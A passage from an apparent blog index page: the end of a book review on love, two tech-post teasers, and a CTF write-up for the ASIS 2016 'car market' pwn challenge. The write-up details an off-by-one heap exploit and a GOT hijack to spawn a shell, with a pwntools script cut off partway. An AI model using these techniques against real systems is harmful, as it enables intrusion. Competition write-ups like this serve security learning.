<h3 id="依赖性"><a href="#依赖性" class="headerlink" title="依赖性"></a>依赖性</h3><p>依赖性不是爱。我们会见到各种依赖性的行为，比如小孩对父母的依赖，妻子对丈夫的依赖，甚至父母对小孩也有依赖。一些小孩长大之后离开家门，父母会特别难受，但都会调整接受。如果一个父母因为对小孩有依赖，阻止孩子去外地上学或者工作，那么这种依赖性就不是爱了，因为它其实对孩子的发展并不有利。</p>
<p>反过来，父母的这种行为对于自己也是不利的，因为这也体现出他们的人格并不独立。总有一天，孩子还是会追求自由与不受控制，到时候父母也容易产生心理问题。</p>
<p>所以，过度的依赖行为其实使孩子和父母都丧失了人格的独立性，是不利于心智发展的，所以不是爱。</p>
<h3 id="自我牺牲"><a href="#自我牺牲" class="headerlink" title="自我牺牲"></a>自我牺牲</h3><p>自我牺牲不是爱。我们常常见到这样的行为：爷爷奶奶给孙子孙女买特别多的玩具，什么事情都惯着孩子，为了满足孩子的各种需求，甚至会牺牲一些自己的东西，例如金钱，健康，时间。这些牺牲如果是利于孩子身心发展的，那就是爱；如果最终使得孩子产生很坏的生活习惯和沟通方式，那么不但不是爱，还是一种伤害。</p>
<p>所以，自我牺牲的付出不一定是爱，还得看付出之后的效果是怎样的。</p>
<h3 id="感觉"><a href="#感觉" class="headerlink" title="感觉"></a>感觉</h3><p>爱，不是感觉。爱是一种行为，而不是一种感觉。如果你整天只是把爱挂在嘴上，但是并没有任何行为付出，那么其实这就不是爱。作者在书中指出，一些家庭的父母并不关心孩子的身心，只知道通过简单粗暴的方式来教育孩子，嘴上说是爱孩子，其实根本就没有付出真正上的行为。</p>
<p>作为父母，把孩子喂饱，提供教育相关的资金支持，仅仅是尽到了最基本的义务。而和孩子一起玩耍，交流，解决孩子的困难，纠正孩子的错误，关注和帮助孩子成长，才是更重要的行为。</p>
<h2 id="如何爱"><a href="#如何爱" class="headerlink" title="如何爱"></a>如何爱</h2><p>那么，我们应该如何去爱呢？作者介绍了一些原则：</p>
<ol>
<li>首先，爱与不爱最显著的区别之一，在于当事人的意识思维和潜意识思维的目标是否一致。</li>
<li>第二，爱是长期的和渐进的过程。爱是自我完善，意味着心智不断成熟。爱，能够帮助他人进步，也会使自我更加成熟。</li>
<li>第三，真正意义上的爱，既是爱自己，也是爱他人。爱，可以使自我和他人感觉到进步。不爱自己的人，绝不可能去爱他人。</li>
<li>第四，爱是自我完善，也是帮助他人完善。它意味着持续努力，超越自我界限。</li>
</ol>
<p>在以上原则下，作者提供了一些实践的办法：</p>
<ol>
<li>关注：爱最重要的体现形式，就是关注。体现关注，一种最常见、最重要的方式，就是 “倾听”。</li>
<li>自律：自律，是将爱转化为实际行动的过程。这里面涉及情绪的控制，我们既不能过于放纵情绪，也不能过于压抑情绪。</li>
<li>独立：爱的重要特征之一，在于爱者与被爱者都不是对方的附属品。付出真爱的人，应该永远把爱的对象视为独立的个体，永远尊重对方的独立和成长。</li>
</ol>
<p>最终，如果我们这么做，就会产生精神贯注的现象：</p>
<blockquote>
<p>真正的爱，是自我完善的特殊体验，跟自我界限有着密切关联。陶醉在爱的情感里，我们感觉灵魂无限延伸，奔向心爱的对象。我们渴望给对方滋养，我们希望对方成长。被自我界限之外的对象吸引，迫使我们产生冲动，想把激情乃至生命献给对方，心理学家把这样的激情状态，称为 “精神贯注”。我们贯注的对象，正是所爱的人或所爱的事物。</p>
</blockquote>
<h2 id="爱的风险"><a href="#爱的风险" class="headerlink" title="爱的风险"></a>爱的风险</h2><p>即便我们做到了真正的爱，但是也会面临一些风险：</p>
<ol>
<li>死亡的风险：精神贯注的代价之一，似乎是或早或晚你都要因为贯注对象的死亡或离去，让自己饱受痛苦的折磨。如果不想经受个中痛苦，就必须放弃生活中许多事物，包括子女、婚姻、性爱、晋升、友谊，但惟有这些事物，才能够使人生丰富多彩。</li>
<li>独立的风险：我们必须不再完全依赖任何人，成为一个人格独立的个体。</li>
<li>承诺的风险：我们需要具有责任感，承诺与爱相关的义务。</li>
<li>冲突的风险：我们需要面临与所爱的人的冲突，并且在冲突发生时，以帮助对方心智成熟作为出发点，来解决冲突。只有以爱为出发点，投入全部的情感，做出真挚的承诺，才能更好地滋养对方的心灵。例如，父母和孩子发生冲突时，首先应该自我检讨，认清自己的价值观，才能采取正确的方式，才能恰当地教育孩子。</li>
</ol>
<p>关于死亡的风险我深有感触。我现在 30 岁了，整个身体都不像 20 多岁那样有活力了，加班太晚会感觉特别累。我相信有一天，我会发现自己真的老了，不光精力大不如从前，可能视力，听力都退化了，那个时候我需要放弃很多年轻时获得的成就，但是这就是人生，所有人都逃避不了死亡。</p>
<p>关于冲突，我也有一些体会。我有时候在家里会抱怨一些事情，后来我发现，这除了让我和家人产生矛盾以外，完全无助于解决任何问题。所以我开始反思我是否应该用更加有效的方式来和家人沟通，试过几次之后，我发现家人也这些事情也有自己的看法。在冲突发生时，用诚实和谦逊的态度先自我反省，再进一步沟通，最终大家会学会到更好的相处方式。这确实也让我的心智更加成熟了，对情绪的控制（自律能力）更强了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a target="_blank" rel="noopener" href="http://item.jd.com/11323419.html">《少有人走的路》</a> 让我对爱有了更客观的认识，一句话总结：爱就是一种精神贯注的行为，它可以使自己和对方的心智都成长起来，从而获得健全的人格。</p>
<p>但是作者也坦诚地说，这样的定义还是无法解释很多爱的行为，不过对于我来说，已经学到很多了，推荐给大家。以下是本书第二部分的思维导图总结：</p>
<img src="/images/the-road-less-traveled-mindnode.jpg" class="">

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/15/2016/boxy-the-most-hackable-theme-fot-st3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/15/2016/boxy-the-most-hackable-theme-fot-st3/" itemprop="url">Sublime Text 3 主题推荐 —— Boxy</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-15T15:49:52+08:00">
                2016-09-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
                    <span itemprop="name">日常</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><img src="https://packagecontrol.io/readmes/img/e6c0cad6561d9317c095a0ab52e6fd890eebd842.gif" alt="BOXY"></p>
<p>用了好久的 Predawn，打算换个 Theme 和 Color Scheme 试试。在网上逛了一段时间后，我找到了一个很不错的 ST3 主题，这里分享一下：</p>
<blockquote>
<p>Boxy Theme</p>
<p>The most hackable theme for Sublime Text 3</p>
</blockquote>
<p>这个主题在 Package Control 上的页面在<a target="_blank" rel="noopener" href="https://packagecontrol.io/packages/Boxy%20Theme">这里</a>，这是一个非常强大的主题，你可以去看看它的介绍视频。</p>
<p>Boxy 提供了很多自定义选项，因此你甚至可以把 Sublime 打扮成 Atom、VS Code，甚至是同为 ST 主题的 Predawn&#x2F;Material 的样式，简直碉堡了好吗：</p>
<p><img src="https://img.prin.studio/legacy/image.php?di=VFYA" alt="Screenshot"></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/15/2016/boxy-the-most-hackable-theme-fot-st3/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/15/2016/yet-another-solution-for-javascript-i18n/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/15/2016/yet-another-solution-for-javascript-i18n/" itemprop="url">又是一种用于 JavaScript 的前端国际化方案</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-15T12:04:31+08:00">
                2016-09-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>现在 Blessing Skin Server 的 HTML 模板是使用 Laravel 自带的本地化来实现多语言支持的，并且使用了 <a target="_blank" rel="noopener" href="https://github.com/Devitek/laravel-yaml-translation">devitek&#x2F;yaml-translation</a> 这个包把 Laravel 语言文件从默认的 PHP 数组形式改为 YAML 格式的文件。</p>
<p>不得不说数组形式的语言文件简直反人类好吗，一大堆 <code>=&gt;</code> 看的眼晕。。YAML 大法好！(ゝ∀･)</p>
<p>回到正题。虽然 HTML 模板里的国际化是解决了，但是整个应用中需要国际化的地方可不止 HTML 模板，同时还有 JavaScript。但是静态的脚本文件中总不能内嵌 PHP 吧，所以我们得搞个单独的解决方案。</p>
<p>虽然说网上现成的 JS 国际化的库很多，但我总觉得有些看不上眼（可能是我没找到好的），就准备自己实现一下。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/15/2016/yet-another-solution-for-javascript-i18n/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/14/ASIS-CTF-Finals-2016-car-market-177/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/14/ASIS-CTF-Finals-2016-car-market-177/" itemprop="url">[ASIS CTF Finals 2016] car market 177</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-14T18:16:00+08:00">
                2016-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 177<br>Solver: bruce30262 @ BambooFox<br>再次感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 ddaa 幫忙讀 flag XD</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, 有 NX, stack guard, Partial RELRO, 沒 PIE</p>
<p>程式主要有三個選單。一開始進入第一個選單，我們可以 add car, remove car, list car 跟 select car。select car 之後進入第二個選單，可以選擇印出 car 的 info，設定 car 的資訊以及新增一個 customer。新增 customer 時會進入第三個選單，可以設定 customer 的名字和 comment。</p>
<p>程式主要有兩個 data structure，分別是 <code>car</code> 與 <code>customer</code>，structure 內容如下:</p>
<figure class="highlight c"><figcaption><span>car</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">car</span>&#123;</span></span><br><span class="line">  <span class="type">char</span> model[<span class="number">16</span>];</span><br><span class="line">  <span class="type">long</span> price;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">customer</span>* <span class="title">customer</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><figcaption><span>customer</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">customer</span>&#123;</span></span><br><span class="line">  <span class="type">char</span> first_name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="type">char</span>* comment; <span class="comment">// buffer size: 0x48</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>透過一些 reversing 以及 fuzzing，我們可以整理出程式裡面一些較為重要的行為:  </p>
<ul>
<li>global data 段會有個 pointer <code>ptr</code>，型態為 <code>struct car**</code>。程式一開始會 malloc 一塊 buffer 給 <code>ptr</code>，之後會拿來存 <code>car*</code> 的 array。  </li>
<li>在新增一個 <code>car</code> 的 customer 的時候，程式會先檢查 <code>car-&gt;customer</code> 與 <code>car-&gt;customer-&gt;comment</code> 是否存在。如果存在的話會先對這兩塊記憶體做 free，之後重新 malloc 兩塊記憶體給這兩個 data，確保一個 <code>car</code> 裡面只會有一個 customer。  </li>
<li>程式在處理使用者輸入的時候有存在多個 <strong>off-by-one</strong> 的漏洞。如果在設定 <code>model</code>, <code>first_name</code> 以及 <code>name</code> 的時候，輸入一個較長的字串，我們就有辦法觸發這個漏洞，<strong>造成 structure 中的下一個 data 的第一個 byte 被蓋成 null byte。</strong></li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我們要有辦法 leak 一些 address。</p>
<p>首先是 heap 的 address。這部分可以透過以下操作來拿到: </p>
<ul>
<li>新增 customer，進入選單三  </li>
<li>離開選單三</li>
<li>再進一次選單三</li>
<li>離開選單三並印出 customer 資訊，此時 <code>customer-&gt;first_name</code> 會是一個 heap 的 address</li>
</ul>
<p>會這樣是因為我們在第二次進入選單三的時候，程式會檢查到 <code>car-&gt;customer</code> 與 <code>car-&gt;customer-&gt;comment</code> 的存在，並且會嘗試去 free 這兩塊記憶體。此時 free 完之後，<code>customer</code> 這個 chunk 的 fd (<strong>也就是 <code>customer-&gt;first_name</code> 的位置</strong>) 會被寫成下一個 free chunk 的 address，因此如果這時我們印出 customer 的 first_name，就可以拿到 heap 的 address。</p>
<p>下一個是 libc 的 address。這部分我們可以利用前面提到的 off-by-one 漏洞，搭配 <strong>fastbin corruption</strong> 的方式來做到。方法如下:</p>
<p>假設我們有一個 <code>car</code>，它的 <code>customer</code> 的 memory layout 長的像這個樣子:</p>
<pre>
             +------------------+
customer     |........first_name| char first_name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+32  |..............name| char name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+64  |        0x12345680| char* comment
             +------------------+ 
</pre>

<p>此時如果我們再輸入一次 <code>name</code>，並給一個長度超過 32 的字串的話，我們就可以透過 off-by-one 的漏洞，**將 comment 的 pointer 從 <code>0x12345680</code> 改成 <code>0x12345600</code>**。之後程式在 free <code>car-&gt;customer-&gt;comment</code> 的時候，就會 free 到一個錯誤的 chunk。如果我們這時又有一個 <code>car</code>，它的 memory layout 長這樣:</p>
<pre>
                      +------------------+
    car    0x123455F0 |               0x0| char model[16]
                      +------------------+
                      |              0x51|
                      +------------------+
    car+16 0x12345600 |              0x64| long price
                      +------------------+
    car+24 0x12345608 |        0x12348880| struct customer* customer
                      +------------------+
</pre>

<p>此時我們可以透過設定 <code>car-&gt;model</code> 來偽造 <code>0x12345600</code> 這塊 memory chunk 的 header，讓程式誤以為它是在 free 一個 size 為 0x50 的 memory chunk (size &#x3D; 0x50，跟 <code>comment</code> 的大小一樣)，並將 <code>0x12345600</code> 這個 memory chunk 加入 fastbin 裡面。 這麼一來我們就製造了一個 <strong>Use-After-Free</strong> 的情形，其中 <code>0x12345600</code> 是我們的 dangling pointer。之後再新增一次 comment 的時候，程式會 malloc <code>0x12345600</code> 來當作是 comment 的 buffer。此時，comment 的 buffer 將會和某個 <code>car</code> 的 structure 重疊，之後我們就可以藉由更改 comment 來修改 <code>car</code> 的 structure。</p>
<p>可以改 <code>car</code> structure 之後，我們就可以將 <code>car-&gt;customer</code> 這個 pointer 改成 <code>atoi</code> 的 GOT。之後我們就可以藉由印出 <code>car-&gt;customer-&gt;first_name</code> 來 leak <code>atoi</code> 的 GOT，得到 libc 的 address。</p>
<p>因此整理一下 leak libc address 的方法:</p>
<ol>
<li>先新增幾個 <code>car</code>，讓其中一個 <code>car</code> 的 address 是以 <strong>0xf0</strong> 做為結尾 (ex. <code>0x123455f0</code>)，並在 <code>car-&gt;model</code> 裡面放上假的 chunk header</li>
<li>利用 off-by-one 漏洞更改某個 customer 的 comment 指標 (ex. <code>0x12345680</code> –&gt; <code>0x12345600</code>)</li>
<li>離開並重新進入選單三，讓程式可以去 free 更改後的 comment 指標</li>
<li>再新增一個 comment，此時新的 comment buffer 會和其中一個 <code>car</code> structure 重疊，因此我們可以藉由更改 comment 的方式來偽造 <code>car</code> structure，將 <code>car-&gt;customer</code> 改成 <code>atoi</code> 的 GOT</li>
<li>印出 <code>car-&gt;customer-&gt;first_name</code>，leak <code>atoi</code> 的 GOT，得到 libc 的 address</li>
</ol>
<p>拿到 libc 的 address 之後就可以計算 <code>system</code> 的位址 (這題有給 libc.so)。因為這題 GOT 可寫，所以可以嘗試將 <code>atoi</code> 的 GOT 改成 <code>system</code> 之後 hijack <code>atoi</code> 的 GOT。本來一開始我是想用前面的方式來直接改 <code>atoi</code> 的 GOT，因為此時 <code>car-&gt;customer</code> &#x3D; <code>atoi@got.plt</code>，因此我們可以藉由更改 <code>car-&gt;customer-&gt;first_name</code> 的方式來 overwrite GOT 的內容。</p>
<p>只是嘗試這樣做之後發現程式會 crash。原因是因為要進入選單三更改 first_name 時，程式會先嘗試去 free <code>car-&gt;customer</code>，此時因為這個位置是 <code>atoi</code> 的 GOT，因此 <code>free(atoi@got.plt)</code> 時會炸掉。<strong>此時，文章前面提到的 <code>ptr</code> 變數便派上用場了。</strong></p>
<p><code>ptr</code> 是一個指向 <code>car*</code> array 的 pointer。因為我們現在可以藉由更改 comment 的方式來控制 <code>car</code> 的 structure，因此如果我們將 <code>car-&gt;customer</code> 改成 <code>ptr</code>，之後程式在 <code>free(car-&gt;customer)</code> 的時候就會去 free <code>ptr</code>，<strong>我們就可以把整個 <code>car*</code> array 給 free 掉</strong>。之後新增 comment 的時候，glibc 會把 <code>ptr</code> 的 chunk 做分割，將其中的 0x50 做為新的 buffer 分配給新的 comment。此時透過更改 comment，我們就可以控制一部分的 <code>car*</code> array。之後將 <code>car</code> 指標改成 <code>atoi</code> 的 GOT，我們就可以藉由更改 <code>car-&gt;model</code> 的方式來覆寫 <code>atoi</code> GOT 的內容，達到 hijack GOT 的效果。</p>
<p>將上述方法整理一下:</p>
<ol>
<li>透過 comment 更改 <code>car</code> 的 structure，將 <code>car-&gt;customer</code> 改成 <code>ptr</code></li>
<li>離開並重新進入選單三，讓程式可以去 free 更改後的  <code>car-&gt;customer</code></li>
<li>新增一個 comment，此時新的 comment buffer 會和 <code>car*</code> array 重疊，我們可以藉由更改 comment 的方式來控制 <code>car*</code> array</li>
<li>將其中一個 car 指標改成 <code>atoi</code> 的 GOT，並藉由更改 <code>car-&gt;model</code> 的方式，將 <code>atoi</code> 的 GOT 改成 <code>system</code> 的 address，做 GOT hijacking</li>
</ol>
<p>之後我們在輸入選項時，就可以輸入 <code>sh\x00</code>，執行 <code>system(&#39;sh&#39;)</code> 拿 shell。</p>
<figure class="highlight python"><figcaption><span>exp_car.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;car-market.asis-ctf.ir&quot;</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./car_market&quot;</span></span><br><span class="line"><span class="comment">#LIBC_PATH = &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;./car_libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_car</span>(<span class="params">model, price</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;model\n&quot;</span>, model)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;price\n&quot;</span>, <span class="built_in">str</span>(price))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sel_car_cust</span>(<span class="params">idx, cust_zip</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (choice, data) <span class="keyword">in</span> cust_zip:</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, data)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust mode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;3&quot;</span>) <span class="comment"># add com</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, <span class="string">&quot;123&quot;</span>) <span class="comment"># input com</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit cust</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;1&quot;</span>) <span class="comment"># list</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Firstname : &quot;</span>)</span><br><span class="line">    heap_base = u64(r.recvline().strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>)) - <span class="number">0xb90</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_got</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span 